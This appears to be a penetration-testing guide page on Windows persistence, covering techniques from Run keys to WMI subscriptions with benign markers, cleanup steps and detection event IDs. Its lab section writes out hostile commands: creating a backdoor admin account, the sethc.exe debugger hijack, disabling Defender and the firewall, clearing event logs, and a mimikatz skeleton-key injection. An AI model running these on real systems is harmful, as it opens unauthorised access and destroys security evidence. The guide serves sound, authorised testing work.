# Windows Persistence

Persistence validates whether an attacker can retain access after a reboot, logon, or credential change. It is a high-impact phase of an assessment because every mechanism changes the target and may continue running after testing ends.

{% hint style="danger" %}
Obtain explicit written approval before creating persistence. Agree on the mechanism, target, trigger, duration, evidence required, and cleanup owner. Use benign marker actions wherever possible; do not disable security controls, clear logs, or leave reusable access behind.
{% endhint %}

## Assessment workflow

1. Confirm persistence testing is in scope.
2. Record the original state and export any configuration you will modify.
3. Create one uniquely named test artifact.
4. trigger it once and capture proof.
5. Remove only the artifact you created.
6. Trigger the same condition again and verify nothing executes.
7. Record endpoint and SIEM detections for both creation and removal.

Use a unique engagement identifier throughout this page:

```powershell
$AssessmentId = '<ENGAGEMENT_ID>'
$MarkerDir = 'C:\ProgramData\Assessment'
New-Item -ItemType Directory -Path $MarkerDir -Force | Out-Null
```

## Registry Run keys

User-level Run keys execute when that user signs in. Machine-level keys affect all users and require administrative privileges.

Inspect the current state:

```powershell
$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty $runKey
```

Create a benign marker action:

```powershell
$name = "Assessment-$AssessmentId"
$command = "cmd.exe /c echo %DATE% %TIME%>>$MarkerDir\run-key.txt"
New-ItemProperty -Path $runKey -Name $name -Value $command -PropertyType String
```

Evidence and detection:

- Capture the value name, path, data, user, and creation time.
- Monitor registry telemetry such as Sysmon Event ID 13.
- Confirm the child process and marker file appear only after logon.

Cleanup and verification:

```powershell
Remove-ItemProperty -Path $runKey -Name $name
Remove-Item "$MarkerDir\run-key.txt" -Force -ErrorAction SilentlyContinue
Get-ItemProperty $runKey -Name $name -ErrorAction SilentlyContinue
```

## Startup folders

Startup-folder entries run at user logon. Record existing directory contents before adding anything.

```powershell
$startup = [Environment]::GetFolderPath('Startup')
$artifact = Join-Path $startup "Assessment-$AssessmentId.cmd"
'@echo off' | Set-Content $artifact
"echo %DATE% %TIME%>>$MarkerDir\startup.txt" | Add-Content $artifact
Get-Item $artifact
```

Detection focuses on file creation in user or system Startup folders and the process launched at logon. Remove the exact file and marker, then sign in again to verify it does not run:

```powershell
Remove-Item $artifact -Force
Remove-Item "$MarkerDir\startup.txt" -Force -ErrorAction SilentlyContinue
```

## Scheduled tasks

Scheduled tasks provide precise triggers and execution identities. Use a one-time or logon trigger with a benign command rather than a remote payload.

```powershell
$taskName = "Assessment-$AssessmentId"
$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c echo %DATE% %TIME%>>$MarkerDir\task.txt"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2)
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description 'Authorized persistence validation'
Get-ScheduledTask -TaskName $taskName
```

Evidence and detection:

- Security Event ID 4698 records task creation when auditing is enabled.
- Task Scheduler Operational Event ID 106 records registration.
- Capture the task XML, principal, trigger, and action.

Cleanup:

```powershell
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
Remove-Item "$MarkerDir\task.txt" -Force -ErrorAction SilentlyContinue
Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
```

## Services

An automatically started service can provide machine-level persistence, usually as a privileged identity. Creating one requires an executable that behaves like a Windows service; pointing a normal command directly at the Service Control Manager may fail or create unstable behavior.

Inspect services and writable service configuration first:

```powershell
Get-CimInstance Win32_Service |
    Select-Object Name, StartName, StartMode, State, PathName
```

For an approved test, use a purpose-built benign service that writes a marker and exits correctly. Record its binary hash, service name, account, start mode, and original configuration. Service creation commonly produces System Event ID 7045 and Security Event ID 4697.

Cleanup must stop and delete only the named assessment service, remove its approved binary, and verify both the service and process are absent:

```powershell
Stop-Service -Name "Assessment-$AssessmentId" -ErrorAction SilentlyContinue
sc.exe delete "Assessment-$AssessmentId"
Get-Service -Name "Assessment-$AssessmentId" -ErrorAction SilentlyContinue
```

## WMI event subscriptions

Permanent WMI subscriptions combine an event filter, consumer, and binding under `root\subscription`. They are durable and easy to orphan, so default to enumeration unless explicit validation is required.

```powershell
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter
Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer
Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding
```

If approved, use one unique name across all three objects and a benign marker command. Sysmon Event IDs 19, 20, and 21 can identify filter, consumer, and binding creation. During cleanup, remove the binding first, then the consumer and filter; query all three classes afterward to verify no orphan remains.

## DLL search-order abuse

Some applications load a DLL by name without constraining its path. If a user can write to a searched directory, a same-named DLL may load when the trusted application starts.

Validate safely:

1. Use Process Monitor to capture `NAME NOT FOUND` DLL lookups.
2. Confirm the writable directory is searched before the legitimate location.
3. Use a benign DLL that writes a marker and exports the expected functions.
4. Hash and record the test DLL, application, path, and process tree.
5. Remove the DLL and restart the application to confirm normal behavior.

Do not replace a legitimate DLL or test against business-critical software without a rollback plan.

## COM hijacking

Per-user COM registrations under `HKCU\Software\Classes\CLSID` can override machine-level registrations for processes running as that user. Validate the lookup and trigger with Process Monitor before changing a CLSID.

Record the original registry state, use a unique test CLSID where possible, and remove only the key created by the assessment. Registry telemetry and unusual DLL loads from user-writable paths are the primary detection points.

## High-risk and legacy mechanisms

Accessibility-binary replacement, Image File Execution Options debugger changes, RDP shadowing changes, skeleton-key injection, and domain-controller memory modification can damage host integrity or create broad unauthorized access. Treat them as conceptual findings unless the engagement explicitly requires live validation.

Safer proof options include:

- Demonstrating the writable registry key or file permission
- Showing the effective privilege that would permit the change
- Capturing the vulnerable configuration and affected identities
- Reproducing the full mechanism in an isolated clone or lab

## Lab and Training Exercises

The following commands are useful for learning how high-impact persistence and defense evasion appear in telemetry. Run them only on a disposable Windows VM with a working snapshot. Several actions can lock out users, weaken the host, or destroy evidence.

### Local backdoor account

```powershell
net user assessment-admin '<LAB_PASSWORD>' /add
net localgroup Administrators assessment-admin /add
net localgroup "Remote Desktop Users" assessment-admin /add
```

Capture account-management events and verify the new token's groups. Remove the account when the exercise ends:

```powershell
net user assessment-admin /delete
net user assessment-admin
```

### Accessibility debugger persistence

An Image File Execution Options debugger can replace an accessibility process launched from the sign-in screen:

```powershell
reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
```

This creates unauthenticated SYSTEM command execution at the console. Remove and verify the exact value:

```powershell
reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
```

### Security-control changes

These commands deliberately weaken the VM and should be paired with telemetry review and immediate restoration:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
netsh advfirewall set allprofiles state off
```

Restore the controls before ending the lab:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
netsh advfirewall set allprofiles state on
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled
netsh advfirewall show allprofiles state
```

### Event-log clearing

```powershell
wevtutil.exe cl System
wevtutil.exe cl Security
```

Event-log deletion is irreversible and destroys host evidence. Use it only to learn the alerts and secondary artifacts generated by clearing a log, never as assessment cleanup. Windows commonly records Security Event ID 1102 and System Event ID 104 around this behavior.

### Domain-controller memory persistence

Skeleton-key injection modifies LSASS memory so an alternate password authenticates domain users until the domain controller restarts:

```powershell
mimikatz "privilege::debug" "misc::skeleton"
```

This affects an authentication authority and must remain confined to an isolated directory-services lab. Reboot the affected domain controller to remove the in-memory patch, then verify normal authentication and review endpoint alerts.

## Detection reference

| Mechanism | Useful evidence |
| --- | --- |
| Run keys | Registry auditing; Sysmon Event ID 13 |
| Startup folder | File creation telemetry and logon process tree |
| Scheduled task | Security 4698; Task Scheduler Operational 106 |
| Service | System 7045; Security 4697 |
| WMI subscription | Sysmon 19, 20, and 21 |
| DLL or COM loading | Sysmon 7, Process Monitor, unusual user-writable paths |

## Closeout checklist

- [ ] Original state captured
- [ ] One uniquely named artifact created
- [ ] Trigger and impact demonstrated once
- [ ] Creation and execution telemetry collected
- [ ] Exact artifact removed
- [ ] Trigger repeated with no execution
- [ ] Remaining files, keys, tasks, services, and sessions checked
- [ ] Cleanup evidence included in the report

## Related

- [Shells & Payloads](shells-payloads.md)
- [Windows Privilege Escalation](windows-privesc-methodology.md)
- [Credential Dumping](credential-dumping.md)
- [Lateral Movement](lateral-movement.md)
- [Report Writing](report-writing.md)
